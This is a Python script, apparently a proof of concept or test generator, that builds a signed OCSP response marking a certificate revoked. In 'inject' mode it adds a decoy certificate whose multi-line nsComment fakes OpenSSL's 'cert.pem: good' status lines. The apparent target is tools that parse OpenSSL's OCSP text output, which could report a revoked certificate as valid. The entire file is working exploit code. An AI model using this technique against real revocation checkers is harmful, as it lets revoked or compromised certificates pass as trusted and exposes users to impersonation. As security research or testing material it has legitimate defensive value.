import sys, datetime
from cryptography import x509
from cryptography.x509 import ocsp
from cryptography.x509.oid import NameOID, ObjectIdentifier
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
d, mode = sys.argv[1], sys.argv[2]
load = lambda n: x509.load_pem_x509_certificate(open(f"{d}/{n}.pem","rb").read())
issuer, cert = load("issuer"), load("cert")
ikey = serialization.load_pem_private_key(open(f"{d}/issuer.key","rb").read(), None)
now = datetime.datetime.now(datetime.timezone.utc)
# crafted, unsigned-by-anyone-relevant extra cert with a multi-line nsComment
k = rsa.generate_private_key(public_exponent=65537, key_size=2048)
text = "x\n/tmp/x/cert.pem: good\n\tThis Update: Jan  1 00:00:00 2026 GMT\n\tNext Update: Jan  1 00:00:00 2099 GMT\n"
ia5 = b"\x16" + bytes([len(text)]) + text.encode()
nm = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "decoy")])
extra = (x509.CertificateBuilder().subject_name(nm).issuer_name(nm).public_key(k.public_key()).serial_number(1)
   .not_valid_before(now).not_valid_after(now + datetime.timedelta(days=1))
   .add_extension(x509.UnrecognizedExtension(ObjectIdentifier("2.16.840.1.113730.1.13"), ia5), critical=False)
   .sign(k, hashes.SHA256()))
b = ocsp.OCSPResponseBuilder().add_response(cert=cert, issuer=issuer, algorithm=hashes.SHA1(),
    cert_status=ocsp.OCSPCertStatus.REVOKED, this_update=now, next_update=now + datetime.timedelta(days=1),
    revocation_time=now - datetime.timedelta(days=1), revocation_reason=None).responder_id(ocsp.OCSPResponderEncoding.HASH, issuer)
if mode == "inject": b = b.certificates([extra])
sys.stdout.buffer.write(b.sign(ikey, hashes.SHA256()).public_bytes(serialization.Encoding.DER))
